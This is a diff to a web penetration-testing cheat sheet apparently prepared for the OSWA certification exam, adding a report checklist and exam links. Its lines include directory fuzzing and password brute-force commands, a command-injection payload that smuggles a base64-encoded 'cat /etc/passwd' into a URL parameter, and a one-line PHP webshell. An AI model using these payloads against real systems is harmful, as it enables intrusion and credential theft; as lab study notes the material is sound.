@@ -3,8 +3,8 @@
 ### Discovery
 * sudo nmap -sS -sV -Pn -A ip_addr
 * File / directory discovery
-	*  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 301,404,403 http://site/FUZZ (<b>FOR FILES</b> use raft-medium-files.txt)
-	* dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u URL --full-url (add -e extension such as -e php for specific extension targeting) (<b>FOR FILES</b> use raft-medium-files.txt)
+	*  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 http://site/FUZZ (<b>FOR DIRECTORIES</b> use raft-medium-directories.txt)
+	* dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u URL --full-url (add -e extension such as -e php for specific extension targeting) (<b>FOR DIRECTORIES</b> use raft-medium-directories.txt)
 	* dirb (with php extension, ignore 403, and milliseconds throttled to 100) - dirb http://host/ raft-medium-directories.txt -N 403 -X .php -z 100
 	* gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
 	* gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
@@ -345,9 +345,9 @@ Y2F0IC9ldGMvcGFzc3dkCg==
 [http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`](http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`)
 ```
 
-Simple PHP Webshell
+Simple PHP Webshell (Remember, if you are passing this through an http request, you need to encode!)
 ```
-<pre><?php passthru(\$_GET['cmd']);?></pre>
+<pre><?php passthru($_GET['cmd']);?></pre>
 ```
 
 From the larger example of 
@@ -408,4 +408,29 @@ wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 4
 ```
 wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$URL/login.php"
 ```
+
+
+### Reporting Checklist 
+
+Remember to work on a machine and document/report fully before moving on to another machine
+
+* Reported in Control Panel?
+* Vulnerability reported?
+	* Language describing summary of vuln: "I did XYZ for recon (see step XXXXX) and found services listening on ports ABC, after enumerating/visting the service running on port X, I found (web server, API etc). After finding the service I performed enumeration using the (enumeration tool, dirsearch etc) with the XYZ wordlist (see step XXXXX) which allowed me to find page X. After finding page X, I found the vuln (vuln) in the XYZ functionality by using the (tool) to enumerate that functionality. The (vuln) which is a vuln that allows a user to do XYZ. In the context of the machine I was able to accomplish X through exploiting that vuln with the following payload/code(insert code)"
+* Screenshot of local.txt?
+	* If found in the web ui, screenshot showing the flag in the UI as well as Burp
+	* If found in a shell, screenshot showing the cat command on the flag, as well as ip if we can show that
+* Screenshot of proof.txt?
+	* If found in the web ui, screenshot showing the flag in the UI as well as Burp
+	* If found in a shell, screenshot showing the cat command on the flag, as well as ip if we can show that
+* Summary 
+	* Step by step summary - number each step and reference them in the vuln section
+	* Insert a screenshot for each relevant step
+
+### Exam help
+
+* Exam guide https://help.offensive-security.com/hc/en-us/articles/4410105650964-OSWA-Exam-Guide
+* Proctoring login (from top most machine, not VM) - https://proctoring.offensive-security.com/Student/login
+* Proctoring how-to-faq https://help.offensive-security.com/hc/en-us/articles/360050299352-Proctoring-Tool-Manual
+
 
